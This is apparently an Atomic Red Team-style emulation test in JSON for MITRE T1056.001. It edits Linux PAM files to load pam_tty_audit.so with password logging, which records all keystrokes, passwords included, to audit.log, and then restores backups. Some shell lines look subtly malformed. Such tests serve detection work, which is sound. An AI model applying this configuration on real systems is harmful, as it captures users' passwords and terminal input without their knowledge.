@@ -1,0 +1,97 @@
+{
+  "id": "9c6bdb34-a89f-4b90-acb1-5970614c711b",
+  "name": "Living off the land Terminal Input Capture on Linux with pam.d",
+  "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "b2884e97-c479-448a-8a0e-3e5e943942e0",
+      "type": "execute-command",
+      "data": {
+        "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" \u003e\u003e /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" \u003e\u003e /etc/pam.d/system-auth\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0c3a8ea5-0865-4e52-b0f3-9656ce369ee9",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "955ad727-9633-4bdd-8a7b-e6ec3ad2d49f",
+      "name": "Check dependency 1/1",
+      "description": "Checking if pam_tty_audit.so is installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "aedc9f99-b66f-45c2-b040-77108ead425a",
+      "name": "Resolve dependency 1/1",
+      "description": "Checking if pam_tty_audit.so is installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "echo \"Sorry, you must install module pam_tty_audit.so and recompile, for this test to work\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "10220ce3-e037-4a97-9c5b-4d21b23d1775",
+      "name": "Re-check dependency 1/1",
+      "description": "Checking if pam_tty_audit.so is installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "b2884e97-c479-448a-8a0e-3e5e943942e0",
+      "p": "on-success",
+      "o": "0c3a8ea5-0865-4e52-b0f3-9656ce369ee9"
+    },
+    {
+      "s": "b2884e97-c479-448a-8a0e-3e5e943942e0",
+      "p": "on-failure",
+      "o": "0c3a8ea5-0865-4e52-b0f3-9656ce369ee9"
+    },
+    {
+      "s": "955ad727-9633-4bdd-8a7b-e6ec3ad2d49f",
+      "p": "on-success",
+      "o": "b2884e97-c479-448a-8a0e-3e5e943942e0"
+    },
+    {
+      "s": "955ad727-9633-4bdd-8a7b-e6ec3ad2d49f",
+      "p": "on-failure",
+      "o": "aedc9f99-b66f-45c2-b040-77108ead425a"
+    },
+    {
+      "s": "aedc9f99-b66f-45c2-b040-77108ead425a",
+      "p": "on-success",
+      "o": "10220ce3-e037-4a97-9c5b-4d21b23d1775"
+    },
+    {
+      "s": "10220ce3-e037-4a97-9c5b-4d21b23d1775",
+      "p": "on-failure",
+      "o": "b2884e97-c479-448a-8a0e-3e5e943942e0"
+    }
+  ],
+  "tags": [
+    "T1056.001",
+    "atomic-red-team"
+  ]
+}
